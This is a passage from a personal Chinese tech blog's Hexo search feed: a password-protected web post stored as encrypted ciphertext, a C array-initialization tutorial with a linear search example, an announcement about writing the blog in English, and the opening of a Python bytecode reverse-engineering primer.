f5b7afea369720cf7df16f6b1daf07693a202377406cb284421b7e7bab2401dbd577ab92437d9cba24095ea5c7a42047412b57930d6e6de33035c1fc58455b2f9c6dfd3fba03e3a4cbfa3ba4b1a7b7c503971b34a7090efc80eb80936ba177b3729f946dcad31345c5897333d03077f9f4a070768d2c43ba6974f819c121c58031839162bd472d774b1c5b1b37520ff7c1e78795ced708144722ce64d7f5939e6ad4a6c365a26e42b4b3ea29debc790ef440f564813a951335a70adf48af3a41ac17f37e2e333404735885030d3a186ce90056cdf90eb9570c1cbe753a90dd07fcbfe9c0ca0b277211fcddf6d7419049e342f9758dd0098a5f745a6191046a4ad739ada306bd6791d2bb62a7c989e3acad0d89c575cbbc412caa67a871ab8e9aad24920e31adbcc41b86f892d552962ac0030ebb725f991c368a14f462653f65f7a9bc352f46eaeae50885bc9548c2a6c0988976eb7b7e264c0564887e8dbab275f8bc8d1b0bb42d03ffc5137863e7d0eb3baa6bae95cbef8ea3b492c76a2d35b9afabfe98cb1b068b695637dc4bb39fdf0ad7feb12d07e32f01150b7cec3e9fdfd333c05da22fac898978bf49232bd0146147fa9b6031910860f4460e2848c2ce83641d9ebd2cc5db09f87bcd2b38c2bdbd082981527e1410b93ba617fb4256a09794090d494fd098b24214bb0901cc482f83dd227eecf0b4e005732b318711ea06e3e4e2fce36ba65b3c90f2a91bc6f6006563aeb3f248624e709ea3e82900b002618b6266d0a420902236b6ceb4c62ee3ebc19cac3486529c47a0c9ee45c4a5eee8321f6a6133811775f4674f82e3347567378a01fe7586ec8f72e5dee8e52f472c0e68c80b3fded1ddb17707ef483e78939d55baee5412ae544072d77bf80b24c1d00a0d5191dcbb8b9222fdf810130e327fb4e6492c29613708981f95cf356eaad91013447c9222fcf5b48252340d305d195afc7dea8e72beff18fd9ea31d4268bb54df8fe1f2517ab7e38c8f9ba6f7510e4cc4be711ed8d3b86a5fb8ca5761b2665f43720a7dd1eb1da475b931e0070c61007f6042dc53d512156cd08d8ab3e5161a344b6fb1f1ace9d8b054cc47e1f81549f441f60d6b9a76b6640911c804cb2fa8a37fdf1bdde6f0ba26deaa58bb9db3b309ce43f691efc1dd3b38bde87a761999d50d80c472457cb4b78a854eba85d691774b862fce54a82f24e5694632d8fd2af1b61f479498fc769d89c11f5a589f4ec6f809a8187fff102895ed16488341d9f6d55f1a54b490abdec11366b767d76c63e2f44c56434194257c56d18069a21a3b15606f7fc276b5fafecb85cbddd2aa05eafcc21c7349e5da0db09db303d813251d46392237389391aef4b37b3c7068ec672ddb2fef272344d172a2dfd7a88905a7989dc35865b2e0a985618764dc8a74da6a6bfb9bf9a407ff679d9c69e2e9a7eb94ec84842f4ed4a0c34611860ef82e7d217b796410d4615e96dda79b3b51611e76b1ab126789f0a54695eb21f3aa5f25f7d22b384def64d2cc120ed53cdd6e596960c512c4f671b6cf86b90ec918f027c50c3eb318d26e49dc8584ff0729a53c8e437b72f2f90c41f09c4677195cf9a700af4465c4a9eb4251d06aac3d239d583b8b1d185475c2c91f8484e41f689a098998bce9952ae75d71e05245269ab6eabd0444de2a51fb1eae5e7b3bf1b1bc4c57edb4781eefd759e8985a12a3bd7454930827ae38af3ccd625d4564442b32b7090a0492820d93c5e2f24649509ae989a6ed13a1125d7a1422272ccc9f14d29f365e9aa0bda4738cb988d9948cc4c43691b95a8d3a4a60fa5d4048a9dfcac65e275866a24dee48b88fad17c27510d2529930379fb0222b1e27e3d077bc64efd4ea04365716961107220c9027997dd4198e1d3160d6e87c0f6e4bcbbcc8ab03ab8126b589cfc94233267421811cb9fea32ac8ee3b82fff56d859cf780b30a7b91cd88264da1df091f5dbcaad5f4c0e2de4ff7fbf4c44e753843b1dc54333f229a8c0e0c5e0c847213757176f3c68f68d853a75572ef9a92b5193aca3cddd379c9594d5887c9c1a0a350a7f23d9a2da5ad09f79824b7535efc173f65df846eac07496d7ff64ffd4faaeed75822f95c03954e601618091e9fb165d38406d2090af095213a18911d2b1fab7dcd69c0f6a18fe31e0ed709917d11c2298f74516ad11f0201bb93583a03b4327f26eccea440b0581654f7e93093a427af9091731deda73a7bc61d9b9dbbb9a85156e9b4ac1fe629120d815e244e8fed566381b4ce08918372fc184ba87faa8ba774068e41eeef4f53cfb0613717c5ff7383731bc8cd5ab2ba7de5d13dae44f4ebd1ba1f18b7a2543759c0b9187e555eebb8484ccebc6b82346ba2618311304a1753c0ad45be98069e33f6b3c8ebcd5874caa83af90ea04b92248b8fd235a6f99ad191e64d76c52629e0f5aec43933c62ce8bb52669cc17af6924587c43f09dd0ffc31695a2c22cfd4726dfd32ba7bfbf9345f9153f6dba575bcf9452210ed3d9b74420e8ceb6d3844222e788135952aa88ff6264e1a5b228c99a60932aa941df3761d4b50a44b9c78085cbc369358b44f1a9c475b7678ca9b9240f0c19089ceb89b2b90c39469cbd976dcfb913375d57246c59516272ae969df03c36982377249cbf3cf14c6df7a27d7dd4d18bdc331d859a4da2f413fd43557a8bb6b54694e21531aeb3a92681f00dce740b485967d5358c594fa5ab5197466314cf9500feae1d274ec10c11e60d87a39cf86eae4edb264ca95a3851fcc1161af1b5bfb3f8c677e251803ad18c257a613afefdfbac01110a9ca9312525c9c5b119413ed04444b0402fb21fbee6708620521eaaa53a5ad503ce7bed3a945c19f2e99edcce2fced93d10436655faec3cba0c653d47edd4502bbc304b9694310956a0db3ab28c80571684a79c1f4da97faf6bc7e9c6fc722f7769b089188fa07ef78f269c2657683c5d678864d86d32dd32173f8982254af8a55435ef3dfb545d4cf663cde2cace4478913ecf93ed54a97a2e2d67e1f21147be0b24982b9df683b4607c9fe3215013e4887761affcf25927c6dea4605098fd4cc37704ddd4b5ba051c52aaec9172a7ca0b50c17b611ecc01c0ae64b87e3749f8fe6c3aaf85e3a8dd18833be3bd2d9d1438dfae459abc9497dab7675cdf8101554fb25e05c93c13c0b00f4c3e05c4d2af74b51f23c95ffc07e4036cfa9851e14b57ee295ec5a06ff0d28979cd85b6b0c0683d679e75607d3baf3ffdf47f27131cfedfc2414440b8f4236a7060a5e635e45d67bf32e93c1b29d843b4ab760736d3b3040c859e774dfabe0211e86318513f9b8e15f1a28637779f2d475c1f1adb908fa7c1c34ec94267fddaaf78c28a215ef3f00505a6d39049adfbcca10edf7ad713f267745d171f9f5ba9896026e968a4c46cc9f5f00fe90216ca68ac4d6c1892b9b997ed01d2d64174f7a7b15456d3a9eee9e44ba6ffefd1d93cefcb2157c42d1a169a2cfc8547ab50ac49664da92959081fb0ad3b5294e663c6cd6f413a3b1af2cbb233c0daa3f03fbc7bde29d0409e0ea3f355be726cbb061eb2a30103d2d43a93e71237d88eeb317d6ced6e59e01ee323595af4bae71b870604f135ccb4be8a5084096366640dcc9043c358b5d17e61553adfeef374f4ac645c56bf5e6fd777d624d437dedcf7a49fc331121cdfa648eff55dcf24a67214534b3d7a0b40dda75ad9deca4be4a23cc19d1e1eeab362123badd1c0804db34c765f9b7edad0c456fddf4ac6728c2dab5562599fdca6fd5c1cdd47d789e837ac9b7135ead3fb02702154765aa78a0f91bb2f2c11d87f898ecfe4c1dcb7c832175fa9b295b244d3d2bf894b153e87927d75bb1965176c7ebdd9627262406e62115a6fe069a9d866438159d2ac4e8749d06a17a027ee10f029f34ee8c3e5016e41c14d94acc1f54724497c81d3df9c2225e82c9fb909d126fbb8e10f8c1f9bcd0d9641fe92dab3ec25da850a5b790a5c36eeeeb47d7887adf060715a23d4e26ad45dadfd173cb0e408d9c0f6f88876b501d0c4e09954dbd30f037b9db8cfcc562e4092ac04b5b88908216d0a312f03ae50b513694b2f0dc0f629ea89482fc328b6c9fd7a240ac1150b9267866b59565119f7326644a33e79994a9ccba8c3fca007a8ba7f3b61b2dfb8f27af739006f37ee2a7828c4dcc11f7ec9b08e50e45a600762235ece430ae20499472012b260f7d2e80f3e66770d8b73c91fa37996fe302cc2d420db68e81f225ac20bd66505c5c5fa0a390b2c685629f6ccc4c870aaa3f78467925412359f2ea0cd6aa5e9ec0268166dbeeb36b63ecd0c52286fd372433556fd2808a737418019d023c968256be2b80a22560ef44322fc3e6055053bac24888463b191c7f6db8d53896ff75ae4a4c11ff9e9a1ca07facc9089d583859342c352595f069e568ab29c98ccf0de5e518bd9b8dd8d867d037695764122c62e2cadbbd0d909963f04f909612232a9ec18f6ca3187e292f86a118b497db0f0f7c79b36f24e99ccbbbaf74cfdf837907f67d7eab33339ecca75b0a93d9d6a221560b13e04ccaaf78e2b8ed2a25a8e776b0dfe6e9785bfb602a254def6ff64f602ed213e0bcaf2273062da86bb02e78e392e20b41c535b1dc7128b4329f38094f05a1cecaa04eaf45c734e84e732e8e4fcf0ae70ee4243cb48cc78eebcac4d4a4f30cc5438a555bbfa527fdf3e329173ec86ef444fe6263d9778ea38c48185f1693df3d8c0eee536d84159e245965f4c57408cba9a81d6efb92dc9d970285716b152ad1f0afb178163d4768e811e789eae26f3146965839859e2f0282ff39b08645901acafc8123f3ae57ed9698b60b65113f6eab1fa52af5ec56b9354fe51ed717982d99d20ed1239cbe2d1a1406ad339b5cd35487bea314f925ad0743eba7d532c89a9f32ee70fe6f89eea6357ef277557f41d3e90c7284a4057c3c13f74bb75b8c554d5e6e2c3f7c804c94bec7701428d335be64a859fea982f21c48117793d8b95d1235820655da30ccb7a5429ad4a10395efb4d80015f32e21cfa3e5e665cd764a434acf218925dabc21d651fcd92c7615699200e5f9ccd350b79afb04e16a4906e3bac4bef925359e5336bbf941028ef60440b33a6e6eb33c1aaa4d2490ddc80d6aeaff409edada73e25faa65ac0631e329f47d351bdab44de13af9c7168a6d9ea1239f606d065474b0b39af3afbfb97e8b601eeb6d7bd99150ad942817b87c897c654dc0a1ea3d75bdf26fb0744f700f7d1176a7db95841304c28b88c05d4d45090a7991fa6b922a7d70092b5b587d9a0af02abdad112e11d703b9839c0c662fdf00fa1a57def766506fde95b0d8cb8c1b25ce76f0fa3c88854b7a0c795d6a23952fdc5ec8c8a8bd259bce2f4d1ce59be91b4188cdce00b44d42602e9c9255a6e639b73ec88c6e5d0c3940523db8da8673638a7129a81a86e63bdf417c498d7735e57239e6f079fe9f198f027ecf43d73728c07ced5c2d32d5d6ae668d33428eb37a41ed230c3f72ed2788bc5ae72c2b20146b08ef1a571dbf9ad5a12dac0695210c6e7494f1cec168362139d2cca88c3dc2b9887a3fa6dc41ffcc64e71b64f62c8e89e02fa177be98c710ac0f1c0b74d361a3a7a99479ce4f737971e3bf0b4e2c0c2b679a2d5fc39c13b4d2b03e7066f7976a513dc7d83377b88903446079e783717da1283efe0b46e221ab620f281aabd292ba29f56e9b6a42800182df5975ee4e20760fa6ca3d3f42151acb45e7056b11d56980c8636df4ee179492db34630bb283ec2abeefed9b30733c9ff89aae565d91af214ba8701d2898fbe5dc4543f7c394421d8852cc27197506d0fd789a518bc8f775184a3dea80ed2f0d578bb01b1d7d8bb57c6b2a0591cc4fd05726473f993beed9a656945306662b35df9a518a0737deda7a1a3ab427da1c549376a8668682dfc25f7079258cef7af9fc3bd4871af47397ea39dc7e37ef73f5b6301123eff10b0dc9b1d65a652fcbafc7b40e3f4828d2d7ca6c7486250a5065fd474b337f48a677ae0e34c8df306b428f5bbca21e95eab5b4302afa720c1a2568251a8dca81c726468bc43a3363a2bebdc302fbfdc6eeece1b458dcde291cc7aab1b8b4303c7589404b6042e236b81122a5072acc1192b8b867b5903e8aff349d18f609b68b99695552b403122f7371d6c9e75487ced33ecd4f4a048082469b7fac4b5aec8fbe6cb5d66e2e4c177ce541ffc54c37130c568d1b7ae134e981649fafc7233289f718f9d826032817b6fbed0780d22e6c8f219f5d99622c6301ccad8c889945d48fa33d77b92b93043b148522484cc91ce8da154017ab210bab7e4b663639680924fc41dc982f762ceff16db77680e502be61dc60e899f090cab1485dc305102dfddf808bad186dbc93d291d85fcdcf03f0752f81c6ba7d5670e7302eb791fe19a3e2142d0456f40c2417803a160fc23a8bb7efa6ffe42111a06494a05662cd139d4e59d2559f79793f9785a7702d66b39aee66c6420de1d20635240fd2aa221749c22357f415805312d303c66000f64964a4ec24865bf208272fdf106f0c4dc9698db602a607937b2aec0a5a294c70f6749f89e1e61200dbbc75e7c3a4ca385e70a899d171399565aefd219748b4b4495536b1b82b2bbcfc8b604c8f197a76eaece55ccd76217844ae5da63a0baab90ab12dbca9ba926849c274b8dd2b4eda14b4e7138a446402b7b1da1963578be8e4ac9818c3a9ccf6e185f5cb5e0f62a8e254d70f716d08fda2f11a2ef06da2ff63225dbd578c10297486a5b701ae1c89e47aa2486f4356f57f45eb0393540ba6d7b4dbfc5a1e09b4af96482855cf38e9f286959d1659a3605504ca9c258cd28a284ad51f3836f1db81cbf0ffbf78fccddf787bea2657a9a4d0638ebc4cbf73bc88da23be45c83b113315a2eb64a02fdc6edb9674cb3c0a993ed299751bf20260c379027db06aab7e23becc286cd65b061f8396d0cf266bb5931120bccde7ad8e0c2a81a4414b5e6622d37177848010b1e757d5f37bb1f6b7802c3764126de704205699609a38ed273d894be4ccfe3b4c3c6a64b52bf279326d0152635c8ca5bd29f5e1ee178d6c8ab16727714465b2d0a7d72d4e43c1429e36a67636c410b3db74b565c25c189be3e6fa9cd269ba3881ac74853e9d994b8a8d973e72aac142df5ab22a7329043a4946864472388e8487a16d4fb5fce7720b6891a3388fdcd2b0bdde1e7eda4597022bca9619c0fa2db9e615d0c44800c3834b37bcc8d2ef6c4b480b6e1f7e1878d0b067eafee2ee17c1d3c63c5812b5685258a0635ee04204756a58274883cf3f6b772cc1071239f5a74910983aa3de4774efad4a711bc360f8ae407a0ef0b015ff1929d54193ca9d8d7ee0e5e4769cbdc320f7523d04055a119b500e531fd71706a5a2763b4462d431f60045571a788d290107e293615beff7889ede37ebd88c7654eb870ae9b4c48c5849b1926825640d6c58b12222f66b637dc51234194160398f725b86e389854212831094ac99f13c9102e621b8c4b130346c2ec70e03c9c7f4ada2c67eafe669869c9b000c9d0eef139fd164870755bf026d9e7a1fa54e86f053f5d856fc5faf125b02c391d0ed186c70b362558e9c976b599fb15f0dd0cc870d1d786ea09b813ed517650ecd7b26baa3352e8f8bed1624c02f2fb88faf6e682e77d7935d2fdb9078555702a1e2ae4db8759356d9baaa81a5c517050fb2b3b992abc3f0c9afa6fee4e4fb7b1a3373a12359d2878098d625a399d5c8f0b44daaf0fdbec153d23f98be3ebeb11ba6285d62664309d843e5a1bec664092aa961d1cd6b6b5993a031fe460b13e6a42e26100cebf276f6a92efca162799ff71223741687ea83321ce99ada9d98ceb9f2b2efd42b33eb6e957a366f8ec3cbf776698fd4ddf6e3e791690b6a4a92ebbabdd01738f421d9817122e5532a95b11ccd7d9f97554b4c891daa1825cd83bcab9755515fbc9140f105c8f8c56f5aee21dcafb1ca8855106a082116f59022dce242eeb0935d7ec990570e1bb56691d4176050ff7c1dd50ba81589cc69219a4fc784d5fc719810f5d48e5fede000179904b2c0f6b5f6f312eb5026c169bba9694e67249dcb598fcc6291cdadc489283f409a501a3821e0c4308b02960e666c0d8280f7a44816a5144437a98a8b1419e8d0422c9b2150cb6d96a7ab5284044a11509a7313ec61d6035235cb2891ec2b768d87eeb6c5f21230a8f74df1b1c7facc4ba3c98b066b78c49b61c832012c2363b4a8e14724a0709376a53940ee61dee2d6dd12fea56b8768d89a66feaad232decf6f655127ae78d2037480043fccfc70b60811e0898ce896b7c4b6d07360372196d4675de2faad750ad2767fa94feea7013830c284b3f88c9c46e0c882893ea66eaadc1d4de28f72433849a6e78ce6988eedacd9e3f0661f7d894ceb6b888a6e74241f5e811df793bfdeca12210b436fd73f1a90ea02b45474ccf8a98b2df8bdedc980eeca2b0b7a2c25fc027ef973c1b7e510673be0775a95da2eed92751ed3278796cf2bf5ec0f31f73aef3144a7134e0d8a0206c31c21c6340f11c2a41873a8cb5dc1166115ccc8bf28311a72fead2c5c4cdbcace47180f3e3c65e0b9b5f4de3769db0bccf752c51ce362066df3e2d5caae867ea7c4338904dec36d0d295e699092e3052e513356d95dbad95d4493bdf33cf2fd98cc8896f9a750ca935d07714fc10cec86c84d40060fb7ac01e644796458849c6e0f4ced5f70ad462c63d6f7a0e49bbca0543857d235e9c8c241966366ffeaa5a7d74fcd5c3d09aa10086006be610f72ac405df3d748929c89d6f07d00501805706942eabfdd4eb50524b7b24c5581ab78ba1aa0d37c1341ba281397c610b84fb37efddd7457a6191a77286a19e54d0ed4f56f69069401d43e4e7202d3c9afbfc3f7b81549d69ac145a666e01c01534a49a5be8bdafe90624a24feb24985cb086f557ff6e98e8e14873cafcf6dca2c11d8ec78fa3c0a3b460f15718709f234efeb207d91fc373105cdaf91b573242a11bc3ec8351cb2652fa25304a3211c1b8fd4a48954d8d4a794643c2bfe5062d0d358fc7156793a2588005350ac649e036df0a243038504851b91c40c1fb6d5ac9c147ff16e09e88ba200ce788ea47e244c1b25e386a889abdb6f45db68f191244ab4dbf0baa1176ec20c123d607a1c6104dcff33d11dde6922a2b050415f5b3d8bba3ceb61c8844d213a254e3ac7f13f0955adabd68bfdffb467b8215515bcaa550c7d980fb8280b60cbfe2a584ea45c41b5896d21989f1dcfd531e8fe5e66f5e259324a3a72892cf81724b5348935533092437de95acf0b5eb9978c4865e134c9fe435005693ec19663cf29d34a914d2f0d521c544a47bab8effd5e3643de5b289a67cd1275a7bc2d86d645d6e3cd9b11a469c275a1dd9cdf26f4e58eef9e29c5da3c0e1142836e2e55968bb5b0e174835dcd7e228a0fe17928e6f32b5c3dc0edb4e9a21bcd2abbfdab280049e0c7464135653e65f2bb04932ea78f299d0f366cfd97a59444f8f764c43fec5fea767b4ee300899dbc5fbe425646c3ceab25a1b169ae299ebdb824f253351126b2d3eae607bae0a1a8d4c6d0b089c62800b3f1bf3adb099341df8e8172e8443ac51d77831eaaa7381faa93f9fe0d46ad3a1bdb296a4bfc00e9a5a0eb55d55ab9685b0d019eca6984df5d62ae1a93dfadbb42509d0810a7ea1cf22a877b7aff7fa42e7c19cc67f19d317f5f2a0acae3cbcfb33c6ed6951a24cf489735edb9d8fb5294d671e42cc391d56b798ffb914443bc19f43f3a755fce09feb760def2af8f75763a93917b2e9f411f3ef9873eaa531a461d77032af1e9c649b1a957f9f0fd75c29d32715f574669395dd9c6007df2147f88fdf1404dcba926e36e8de6726a3d3753d8dc316dea919e504a0cffd5f5d6c2925549d644ce0ddb20f7709f772f289a5f61ccdf73c22b5fb3fe8ec5c2f96cc4568c4492db26f219e266e2e1da76c8208482ec8de3f7d92e80722a690d3cf860d3de06a6c7b911572cae7db30e3f11d05d425a1bd347685b9c2ba64efff66555e725c65ae369999ecec5ee738c1a3524d6d9e291b16a363201946ea06a1ea6d7ecd44331e558be9f601f86f41e2c0a8e06835439927f875d6aaed57b2f6c6e7021eb6269a7175f7b0fb84e65ce0bc8d1404212816e617b67a5321c1023d35060024d8fe621985b54106a0c8ee648c265cf470e40b199c9df2229106c6934f4ab7bf01a8c0d46b8de2ddafb7f9697d64a5f36e8a84a452b06cc6d4079583dba76c650fbf27cf503aea71557e02469811c206c2c536b1783e5903579311a92b4adbe7b17363ef7956c0fdc07d8b556cb219d05b01d7cad3d53d782ccd77e247478f73971d090fd18a0d75d04d096e169f667fb1b16665c7df7dc8f96028cb4235187f54db62d33052879bfcacc3b1d8a5ab46c52cab3a236c03a31027b4c301258b89dc8abbae7c3a674f5b8c1891cb5b5aae8583d2d1564f09cf0b8c3f8828bf7ca6487c81dfef639e5c025e2410396d6a8e6d32ac898d589e3ac901cee9e084d121926b12bc9ed6fd4e44e9a821949ebd0ec1fc7cf58dbb8340f342ea7a96cfcd3c07b75d4750a2b3ff6aa85c4cf9a7b22aba5ef5d232cfd5178eb5b2e752a6069caac9b4edf4aba62264a78dadee7622299f2a0251483ebabf1344edb29fb704465021d1289d811f534cfaacaf52bcd2f18263775ff0c331669d78be90eae734c41b2183ee44e50d5af58d394de861ae0e2b94dbb0606ee82ce814b7d8cbe3838483ebdfd5ca52003dc8adb2c60ec0043f10ff752b71151534ab0e823a56e19e975717f1f818d7687e75880009cd760adf6f441c24aed0fa2ed8d75038ce83dfa4e30c9847a7c2150b4f5cbd449ca24c936f663e5f8789ed0f22e62dfa4d11f34fdf297d5b87d469cb4dff990b39c73c2bb53976f54ebdee9fef5c40adbca300ceff317810e405665fdb2c20e4683c30c504e5018953523f8e6e2062f6c19565a8bc01308571c620950dc19cedef855270b63ef22056395c3e1afc70af5f139ffe8de82ae526e8b60fcc91802c61333d22b860eebc1c3ec0652585af09042b0873e43b4c8beb330856a7e3338067cd8965516668255aed10e968365a47f86428a317e98327897e6a821a16176bc99a729541f4bf578f615e6b2392b1a3915cc72748db95ef09944521a85257a2492a0fba6515bb2d95e9820e05d511243ec35a385e9391ae5c3b7b70efbbb1afff411ae94e018018ce3d2f2ed5fac391079a25a53530b2fd99cff23aa2191f4ff9bf7a2eff7eaf8c7e4190df6d9611e4e88dd289a7cf767b54d15223d7444279c53e4fa5f25f86c61ba246f25a8ad8ab27dd934502a3e3e6448ba36bd17043a78bd17bbc1441c8ba61f813a4dab5de1f0e8d009b727c78e4926c8fcc5472ecde127dce1907ae33ab72d24c58d539ccbdff8b0ade52af0a90778df98b0a06b6eb6bc98099e4dcbba32fdfad37563dc5be6494c7897cfd20d20a0c14ef48aebbabeb06d123be47520892ee87dcfa0fa1235f1714cea1b5b9b60ca1edc31d5fa1084bcd1e668a629c31d377f79f962cbce</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>C语言学习笔记之数组运算</title>
    <url>/2022/12/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E7%BB%84%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<h1 id="Array-Calculation"><a href="#Array-Calculation" class="headerlink" title="Array Calculation"></a>Array Calculation</h1><p>数组计算</p>
<span id="more"></span>
<h2 id="Array-Calculation-1"><a href="#Array-Calculation-1" class="headerlink" title="Array Calculation"></a>Array Calculation</h2><h3 id="Intergrated-initialization-of-arrays"><a href="#Intergrated-initialization-of-arrays" class="headerlink" title="Intergrated initialization of arrays"></a>Intergrated initialization of arrays</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>give the initial value of all elements of the array by directly using “{}”</li>
<li>don’t need to give how large the array is, because the compiler will help you count.</li>
</ul>
<p><img src="https://c.img.dasctf.com/images/20221220/1671545408397-a7c349ed-59d3-45cc-b2a5-acdf1e6f07c5.png" alt="image-20221220221006157"></p>
<h3 id="locate-Intergrated-initialization"><a href="#locate-Intergrated-initialization" class="headerlink" title="locate Intergrated initialization"></a>locate Intergrated initialization</h3><p>postscript: only C99</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>] = &#123;</span><br><span class="line">	[<span class="number">0</span>] = <span class="number">2</span>, [<span class="number">2</span>] = <span class="number">3</span>, <span class="number">6</span> ,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>locate initial data by [n]</li>
<li>data have no located will attach it to the back of front</li>
<li>other location will assign zero(0)</li>
</ul>
<p><img src="https://c.img.dasctf.com/images/20221220/1671545380586-956bd832-4611-4aad-a884-1b5b7b47f225.png" alt="image-20221220220930328"></p>
<h3 id="size-of-array"><a href="#size-of-array" class="headerlink" title="size of array"></a>size of array</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671545579702-5633e418-75fb-4e57-b313-1870bea151bd.png" alt="image-20221220221253372"></p>
<h3 id="array-assignment"><a href="#array-assignment" class="headerlink" title="array assignment"></a>array assignment</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671545697239-01628869-393d-4d93-9135-9b35bdcfed07.png" alt="image-20221220221448348"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671545786976-c9407dfd-cbae-462d-bccb-7af6d8019975.png" alt="image-20221220221620643"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671545915883-d1042d51-4fe1-419e-931b-6ed3923acdf2.png" alt="image-20221220221825875"></p>
<h3 id="full-of-source-code"><a href="#full-of-source-code" class="headerlink" title="full of source code"></a>full of source code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> a[], <span class="keyword">int</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[] = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">int</span> loc;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">	loc = search(x, a, <span class="keyword">sizeof</span>(a)/<span class="keyword">sizeof</span>(a[<span class="number">0</span>]));</span><br><span class="line">	<span class="keyword">if</span> (loc != <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d在%d这里\n&quot;</span>, x, loc);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d不存在&quot;</span>, x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> a[], <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (a[i] == key) &#123;</span><br><span class="line">			ret = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="An-example-for-Array-Calculation"><a href="#An-example-for-Array-Calculation" class="headerlink" title="An example for Array Calculation"></a>An example for Array Calculation</h2><h3 id="determine-prime-number"><a href="#determine-prime-number" class="headerlink" title="determine prime number"></a>determine prime number</h3>]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>一则公告</title>
    <url>/2022/12/20/%E4%B8%80%E5%88%99%E5%85%AC%E5%91%8A/</url>
    <content><![CDATA[<h1 id="An-announcement"><a href="#An-announcement" class="headerlink" title="An announcement"></a>An announcement</h1><p>Hello, my friends. There is Maple-ice. Starting today, I will write articles in English for my blog. This change is painful and difficult for me because I’m bad at using the English language. Even to this day, I don’t pass CET-4. Maybe the decision will make you feel astonished. However, it veritably happens.<br>In the past, I was good at compromising some failures, especially those I was not interested things. I don’t like English. But, if English hinders me from studying CS courses further, I will not escape.<br>Despite this, studying is usually boring, much less studying English. I don’t need to pass any exam, so I hope taking study English is a long-term challenge for me to overcome.<br>Now, I’m ready to face the problem, but where can I take the first step? I think I can change my blog because I enjoy writing technical articles. And I always read them when I encounter problems. Then, the announcement was boring.<br>When I wrote the announcement, I felt unprecedented difficulty in English writing, so I had to use the dictionary and translation software when I thought it was necessary. And when I have completed an article, I will use the grammar checking extension to check it, which promises it is enough to read and understand. If I need to use some technical terms, I will mark them in Chinese as far as possible.<br>Thank you for reading!</p>
]]></content>
  </entry>
  <entry>
    <title>python逆向入门</title>
    <url>/2022/11/17/python%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="python逆向入门"><a href="#python逆向入门" class="headerlink" title="python逆向入门"></a>python逆向入门</h1><p>施工中。。。</p>
<span id="more"></span>
<h2 id="什么是pyc文件"><a href="#什么是pyc文件" class="headerlink" title="什么是pyc文件"></a>什么是pyc文件</h2><p>pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte  code，py文件变成pyc文件后，加载的速度有所提高，而且pyc是一种跨平台的字节码，是由python的虚拟机来执行的，这个是类似于JAVA或者.NET的虚拟机的概念。pyc的内容，是跟python的版本相关的，不同版本编译后的pyc文件是不同的，2.5编译的pyc文件，2.4版本的 python是无法执行的。</p>
